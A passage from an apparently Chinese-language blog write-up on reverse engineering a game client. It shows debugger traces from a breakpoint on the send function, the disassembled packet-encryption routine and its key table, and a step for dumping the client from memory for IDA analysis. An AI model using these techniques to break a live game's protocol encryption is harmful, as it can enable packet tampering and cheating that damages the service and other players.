class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bp ws2_32.send</span><br><span class=\"line\"><span class=\"number\">0019</span>DE30   <span class=\"number\">004</span>A7D69  /CALL 到 send 来自 Main<span class=\"number\">.004</span>A7D63</span><br><span class=\"line\"><span class=\"number\">0019</span>DE34   <span class=\"number\">00000B</span>28  |Socket = B28</span><br><span class=\"line\"><span class=\"number\">0019</span>DE38   <span class=\"number\">00000000</span>  |Data = <span class=\"literal\">NULL</span></span><br><span class=\"line\"><span class=\"number\">0019</span>DE3C   <span class=\"number\">00000000</span>  |DataSize = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0019</span>DE40   <span class=\"number\">00000000</span>  \\Flags = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 栈回溯</span></span><br><span class=\"line\"><span class=\"number\">004</span>A7D5C   .  <span class=\"number\">6</span>A <span class=\"number\">00</span>         push <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">004</span>A7D5E   .  <span class=\"number\">53</span>            push ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A7D5F   .  <span class=\"number\">50</span>            push eax</span><br><span class=\"line\"><span class=\"number\">004</span>A7D60   .  FF76 <span class=\"number\">04</span>       push dword ptr ds:[esi+<span class=\"number\">0x4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7D63   .  FF15 <span class=\"number\">90660E01</span> call dword ptr ds:[<span class=\"number\">0x10E6690</span>]            ;  Main<span class=\"number\">.01144E8</span>D</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0019</span>DE08   <span class=\"number\">00000B</span>28</span><br><span class=\"line\"><span class=\"number\">0019</span>DE0C   <span class=\"number\">19536F</span>80</span><br><span class=\"line\"><span class=\"number\">0019</span>DE10   <span class=\"number\">0000000</span>E</span><br><span class=\"line\"><span class=\"number\">0019</span>DE14   <span class=\"number\">00000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 可以下内存写入断点或者通过栈回溯</span></span><br><span class=\"line\"><span class=\"number\">19536F</span>80  AD <span class=\"number\">8</span>A <span class=\"number\">70</span> E7 <span class=\"number\">48</span> <span class=\"number\">81</span> <span class=\"number\">2</span>A <span class=\"number\">77</span> <span class=\"number\">79</span> E8 A9 A8 EF <span class=\"number\">94</span> <span class=\"number\">72</span>     瓓p鏗?wy瑭攔.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 栈回溯</span></span><br><span class=\"line\"><span class=\"number\">007B</span>8B36  |.  <span class=\"number\">8B</span>0D <span class=\"number\">60010B</span>01 mov ecx,dword ptr ds:[<span class=\"number\">0x10B0160</span>]</span><br><span class=\"line\"><span class=\"number\">007B</span>8B3C  |.  <span class=\"number\">8</span>D45 F0       lea eax,[local<span class=\"number\">.4</span>]</span><br><span class=\"line\"><span class=\"number\">007B</span>8B3F  |.  <span class=\"number\">50</span>            push eax</span><br><span class=\"line\"><span class=\"number\">007B</span>8B40  |.  <span class=\"number\">8855</span> FD       mov byte ptr ss:[ebp<span class=\"number\">-0x3</span>],dl</span><br><span class=\"line\"><span class=\"number\">007B</span>8B43  |.  E8 <span class=\"number\">5F</span>7CC6FF   call Main<span class=\"number\">.004207</span>A7</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 加密前数据</span></span><br><span class=\"line\"><span class=\"number\">0019</span>DE48  E2 B7 <span class=\"number\">0</span>E <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">65</span> <span class=\"number\">00</span> <span class=\"number\">2</span>E <span class=\"number\">8</span>D DC E0 <span class=\"number\">19</span>   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 进入加密函数 call Main.004207A7</span></span><br><span class=\"line\"><span class=\"number\">004</span>A7EA4  /&gt; \\<span class=\"number\">55</span>            push ebp</span><br><span class=\"line\"><span class=\"number\">004</span>A7EA5  |.  <span class=\"number\">8B</span>EC          mov ebp,esp</span><br><span class=\"line\"><span class=\"number\">004</span>A7EA7  |.  <span class=\"number\">837</span>D <span class=\"number\">08</span> <span class=\"number\">00</span>    cmp [arg<span class=\"number\">.1</span>],<span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">004</span>A7EAB  |.  <span class=\"number\">56</span>            push esi</span><br><span class=\"line\"><span class=\"number\">004</span>A7EAC  |.  <span class=\"number\">8B</span>F1          mov esi,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A7EAE  |.  <span class=\"number\">74</span> <span class=\"number\">20</span>         je XMain<span class=\"number\">.004</span>A7ED0</span><br><span class=\"line\"><span class=\"number\">004</span>A7EB0  |.  <span class=\"number\">8B</span>4E <span class=\"number\">30</span>       mov ecx,dword ptr ds:[esi+<span class=\"number\">0x30</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7EB3  |.  <span class=\"number\">85</span>C9          test ecx,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A7EB5  |.  <span class=\"number\">74</span> <span class=\"number\">19</span>         je XMain<span class=\"number\">.004</span>A7ED0</span><br><span class=\"line\"><span class=\"number\">004</span>A7EB7  |.  FF75 <span class=\"number\">0</span>C       push [arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7EBA  |.  FF75 <span class=\"number\">08</span>       push [arg<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7EBD  |.  E8 <span class=\"number\">9316F</span>8FF   call Main<span class=\"number\">.00429555</span>\t\t\t<span class=\"comment\">// 真正的加密函数算法</span></span><br><span class=\"line\"><span class=\"number\">004</span>A7EC2  |.  FF75 <span class=\"number\">0</span>C       push [arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7EC5  |.  <span class=\"number\">8</span>D4E <span class=\"number\">0</span>C       lea ecx,dword ptr ds:[esi+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7EC8  |.  FF75 <span class=\"number\">08</span>       push [arg<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A7ECB  |.  E8 <span class=\"number\">784B</span>F8FF   call Main<span class=\"number\">.0042</span>CA48</span><br><span class=\"line\"><span class=\"number\">004</span>A7ED0  |&gt;  <span class=\"number\">5</span>E            pop esi</span><br><span class=\"line\"><span class=\"number\">004</span>A7ED1  |.  <span class=\"number\">5</span>D            pop ebp</span><br><span class=\"line\"><span class=\"number\">004</span>A7ED2  \\.  C2 <span class=\"number\">0800</span>       retn <span class=\"number\">0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 跟入加密函数 call Main.00429555</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D07  /&gt; \\<span class=\"number\">55</span>            push ebp</span><br><span class=\"line\"><span class=\"number\">004</span>A3D08  |.  <span class=\"number\">8B</span>EC          mov ebp,esp</span><br><span class=\"line\"><span class=\"number\">004</span>A3D0A  |.  <span class=\"number\">51</span>            push ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D0B  |.  <span class=\"number\">51</span>            push ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D0C  |.  <span class=\"number\">56</span>            push esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3D0D  |.  <span class=\"number\">8B</span>75 <span class=\"number\">08</span>       mov esi,[arg<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D10  |.  <span class=\"number\">8B</span>C1          mov eax,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D12  |.  <span class=\"number\">33</span>C9          <span class=\"keyword\">xor</span> ecx,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D14  |.  <span class=\"number\">66</span>:<span class=\"number\">8B</span>0E       mov cx,word ptr ds:[esi]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D17  |.  <span class=\"number\">66</span>:<span class=\"number\">81F</span>9 <span class=\"number\">3B</span>EC  cmp cx,<span class=\"number\">0xEC3B</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D1C  |.  <span class=\"number\">57</span>            push edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3D1D  |.  <span class=\"number\">894</span>D F8       mov [local<span class=\"number\">.2</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D20  |.  <span class=\"number\">75</span> <span class=\"number\">08</span>         jnz XMain<span class=\"number\">.004</span>A3D2A</span><br><span class=\"line\"><span class=\"number\">004</span>A3D22  |.  <span class=\"number\">8</span>D4E <span class=\"number\">08</span>       lea ecx,dword ptr ds:[esi+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D25  |.  <span class=\"number\">8</span>D7E <span class=\"number\">0</span>C       lea edi,dword ptr ds:[esi+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D28  |.  EB <span class=\"number\">06</span>         jmp XMain<span class=\"number\">.004</span>A3D30</span><br><span class=\"line\"><span class=\"number\">004</span>A3D2A  |&gt;  <span class=\"number\">8</span>D4E <span class=\"number\">04</span>       lea ecx,dword ptr ds:[esi+<span class=\"number\">0x4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D2D  |.  <span class=\"number\">8</span>D7E <span class=\"number\">08</span>       lea edi,dword ptr ds:[esi+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D30  |&gt;  <span class=\"number\">837</span>D <span class=\"number\">0</span>C <span class=\"number\">0</span>A    cmp [arg<span class=\"number\">.2</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D34  |.  <span class=\"number\">894</span>D FC       mov [local<span class=\"number\">.1</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D37  |.  <span class=\"number\">897</span>D <span class=\"number\">08</span>       mov [arg<span class=\"number\">.1</span>],edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3D3A  |.  <span class=\"number\">0F</span>82 CA000000 jb Main<span class=\"number\">.004</span>A3E0A</span><br><span class=\"line\"><span class=\"number\">004</span>A3D40  |.  <span class=\"number\">8B</span>0E          mov ecx,dword ptr ds:[esi]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D42  |.  <span class=\"number\">3308</span>          <span class=\"keyword\">xor</span> ecx,dword ptr ds:[eax]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D44  |.  <span class=\"number\">53</span>            push ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D45  |.  <span class=\"number\">890</span>E          mov dword ptr ds:[esi],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D47  |.  <span class=\"number\">8B</span>50 <span class=\"number\">0</span>C       mov edx,dword ptr ds:[eax+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D4A  |.  BB FF3F0000   mov ebx,<span class=\"number\">0x3FFF</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D4F  |.  <span class=\"number\">23</span>CB          <span class=\"keyword\">and</span> ecx,ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D51  |.  <span class=\"number\">0F</span>AF48 <span class=\"number\">08</span>     imul ecx,dword ptr ds:[eax+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D55  |.  <span class=\"number\">66</span>:<span class=\"number\">817</span>D F8 <span class=\"number\">3B</span>&gt;cmp word ptr ss:[ebp<span class=\"number\">-0x8</span>],<span class=\"number\">0xEC3B</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D5B  |.  <span class=\"number\">8B</span>148A        mov edx,dword ptr ds:[edx+ecx*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D5E  |.  <span class=\"number\">75</span> <span class=\"number\">1</span>A         jnz XMain<span class=\"number\">.004</span>A3D7A</span><br><span class=\"line\"><span class=\"number\">004</span>A3D60  |.  <span class=\"number\">8B</span>4E <span class=\"number\">04</span>       mov ecx,dword ptr ds:[esi+<span class=\"number\">0x4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D63  |.  <span class=\"number\">33</span>CA          <span class=\"keyword\">xor</span> ecx,edx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D65  |.  <span class=\"number\">894</span>E <span class=\"number\">04</span>       mov dword ptr ds:[esi+<span class=\"number\">0x4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D68  |.  <span class=\"number\">8B</span>50 <span class=\"number\">0</span>C       mov edx,dword ptr ds:[eax+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D6B  |.  <span class=\"number\">23</span>CB          <span class=\"keyword\">and</span> ecx,ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D6D  |.  <span class=\"number\">0F</span>AF48 <span class=\"number\">08</span>     imul ecx,dword ptr ds:[eax+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D71  |.  <span class=\"number\">8B</span>148A        mov edx,dword ptr ds:[edx+ecx*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D74  |.  <span class=\"number\">836</span>D <span class=\"number\">0</span>C <span class=\"number\">0</span>C    sub [arg<span class=\"number\">.2</span>],<span class=\"number\">0xC</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D78  |.  EB <span class=\"number\">04</span>         jmp XMain<span class=\"number\">.004</span>A3D7E</span><br><span class=\"line\"><span class=\"number\">004</span>A3D7A  |&gt;  <span class=\"number\">836</span>D <span class=\"number\">0</span>C <span class=\"number\">08</span>    sub [arg<span class=\"number\">.2</span>],<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D7E  |&gt;  <span class=\"number\">8B</span>4D <span class=\"number\">0</span>C       mov ecx,[arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D81  |.  C1E9 <span class=\"number\">02</span>       shr ecx,<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D84  |.  <span class=\"number\">85</span>C9          test ecx,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D86  |.  <span class=\"number\">7</span>E <span class=\"number\">1</span>D         jle XMain<span class=\"number\">.004</span>A3DA5</span><br><span class=\"line\"><span class=\"number\">004</span>A3D88  |.  <span class=\"number\">8B</span>F1          mov esi,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D8A  |&gt;  <span class=\"number\">8B</span>0F          /mov ecx,dword ptr ds:[edi]\t\t\t\t<span class=\"comment\">// 关键加密算法</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D8C  |.  <span class=\"number\">33</span>CA          |<span class=\"keyword\">xor</span> ecx,edx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D8E  |.  <span class=\"number\">890F</span>          |mov dword ptr ds:[edi],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D90  |.  <span class=\"number\">8B</span>50 <span class=\"number\">0</span>C       |mov edx,dword ptr ds:[eax+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D93  |.  <span class=\"number\">23</span>CB          |<span class=\"keyword\">and</span> ecx,ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3D95  |.  <span class=\"number\">0F</span>AF48 <span class=\"number\">08</span>     |imul ecx,dword ptr ds:[eax+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D99  |.  <span class=\"number\">8B</span>148A        |mov edx,dword ptr ds:[edx+ecx*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3D9C  |.  <span class=\"number\">83</span>C7 <span class=\"number\">04</span>       |add edi,<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3D9F  |.  <span class=\"number\">4</span>E            |dec esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DA0  |.^ <span class=\"number\">75</span> E8         \\jnz XMain<span class=\"number\">.004</span>A3D8A</span><br><span class=\"line\"><span class=\"number\">004</span>A3DA2  |.  <span class=\"number\">897</span>D <span class=\"number\">08</span>       mov [arg<span class=\"number\">.1</span>],edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DA5  |&gt;  <span class=\"number\">8B</span>4D <span class=\"number\">0</span>C       mov ecx,[arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DA8  |.  <span class=\"number\">83E1</span> <span class=\"number\">03</span>       <span class=\"keyword\">and</span> ecx,<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3DAB  |.  <span class=\"number\">8B</span>348D DC52B6&gt;mov esi,dword ptr ds:[ecx*<span class=\"number\">4</span>+<span class=\"number\">0xB652DC</span>]\t\t<span class=\"comment\">// key table</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3DB2  |.  <span class=\"number\">8B</span>D9          mov ebx,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3DB4  |.  F7D6          <span class=\"keyword\">not</span> esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DB6  |.  <span class=\"number\">8975</span> F8       mov [local<span class=\"number\">.2</span>],esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DB9  |.  <span class=\"number\">23F</span>2          <span class=\"keyword\">and</span> esi,edx</span><br><span class=\"line\"><span class=\"number\">004</span>A3DBB  |.  <span class=\"number\">3337</span>          <span class=\"keyword\">xor</span> esi,dword ptr ds:[edi]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DBD  |.  C1E9 <span class=\"number\">02</span>       shr ecx,<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3DC0  |.  <span class=\"number\">8975</span> <span class=\"number\">0</span>C       mov [arg<span class=\"number\">.2</span>],esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DC3  |.  <span class=\"number\">8</span>D75 <span class=\"number\">0</span>C       lea esi,[arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DC6  |.  F3:A5         rep movs dword ptr es:[edi],dword ptr ds&gt;</span><br><span class=\"line\"><span class=\"number\">004</span>A3DC8  |.  <span class=\"number\">8B</span>CB          mov ecx,ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3DCA  |.  <span class=\"number\">83E1</span> <span class=\"number\">03</span>       <span class=\"keyword\">and</span> ecx,<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3DCD  |.  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[&gt;</span><br><span class=\"line\"><span class=\"number\">004</span>A3DCF  |.  <span class=\"number\">8B</span>7D <span class=\"number\">0</span>C       mov edi,[arg<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DD2  |.  <span class=\"number\">8B</span>4D <span class=\"number\">08</span>       mov ecx,[arg<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DD5  |.  <span class=\"number\">8939</span>          mov dword ptr ds:[ecx],edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DD7  |.  <span class=\"number\">8B</span>58 <span class=\"number\">0</span>C       mov ebx,dword ptr ds:[eax+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DDA  |.  <span class=\"number\">8B</span>4D F8       mov ecx,[local<span class=\"number\">.2</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DDD  |.  BE FF3F0000   mov esi,<span class=\"number\">0x3FFF</span></span><br><span class=\"line\"><span class=\"number\">004</span>A3DE2  |.  <span class=\"number\">23</span>D6          <span class=\"keyword\">and</span> edx,esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DE4  |.  <span class=\"number\">0F</span>AF50 <span class=\"number\">08</span>     imul edx,dword ptr ds:[eax+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DE8  |.  <span class=\"number\">23</span>CF          <span class=\"keyword\">and</span> ecx,edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DEA  |.  <span class=\"number\">330</span>C93        <span class=\"keyword\">xor</span> ecx,dword ptr ds:[ebx+edx*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DED  |.  <span class=\"number\">8B</span>55 FC       mov edx,[local<span class=\"number\">.1</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DF0  |.  <span class=\"number\">890</span>A          mov dword ptr ds:[edx],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3DF2  |.  <span class=\"number\">8B</span>48 <span class=\"number\">04</span>       mov ecx,dword ptr ds:[eax+<span class=\"number\">0x4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DF5  |.  <span class=\"number\">8B</span>50 <span class=\"number\">08</span>       mov edx,dword ptr ds:[eax+<span class=\"number\">0x8</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3DF8  |.  <span class=\"number\">41</span>            inc ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3DF9  |.  <span class=\"number\">23</span>CE          <span class=\"keyword\">and</span> ecx,esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3DFB  |.  <span class=\"number\">0F</span>AFD1        imul edx,ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3DFE  |.  <span class=\"number\">8948</span> <span class=\"number\">04</span>       mov dword ptr ds:[eax+<span class=\"number\">0x4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E01  |.  <span class=\"number\">8B</span>48 <span class=\"number\">0</span>C       mov ecx,dword ptr ds:[eax+<span class=\"number\">0xC</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E04  |.  <span class=\"number\">8B</span>0C91        mov ecx,dword ptr ds:[ecx+edx*<span class=\"number\">4</span>]</span><br><span class=\"line\"><span class=\"number\">004</span>A3E07  |.  <span class=\"number\">8908</span>          mov dword ptr ds:[eax],ecx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E09  |.  <span class=\"number\">5B</span>            pop ebx</span><br><span class=\"line\"><span class=\"number\">004</span>A3E0A  |&gt;  <span class=\"number\">5F</span>            pop edi</span><br><span class=\"line\"><span class=\"number\">004</span>A3E0B  |.  <span class=\"number\">5</span>E            pop esi</span><br><span class=\"line\"><span class=\"number\">004</span>A3E0C  |.  C9            leave</span><br><span class=\"line\"><span class=\"number\">004</span>A3E0D  \\.  C2 <span class=\"number\">0800</span>       retn <span class=\"number\">0x8</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0019</span>DE48  <span class=\"number\">51</span> <span class=\"number\">35</span> <span class=\"number\">36</span> B5 <span class=\"number\">60</span> <span class=\"number\">69</span> B4 <span class=\"number\">9B</span> <span class=\"number\">22</span> <span class=\"number\">2F</span> C7 <span class=\"number\">02</span> F0 F0 <span class=\"number\">19</span>     Q56礰i礇<span class=\"string\">&quot;/?痧\u0019.</span></span><br><span class=\"line\"><span class=\"string\">19536EC0  6D 98 1B C8 4F 4F 22 D0 83 9A 6E 40 11 58 72     m?萇O&quot;</span>袃歯@\u0011Xr.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>DUMP 内存中的 cabal，以供 IDA 分析。dump 动态代码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231022163324856.png\" alt=\"image-20231022163324856\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span 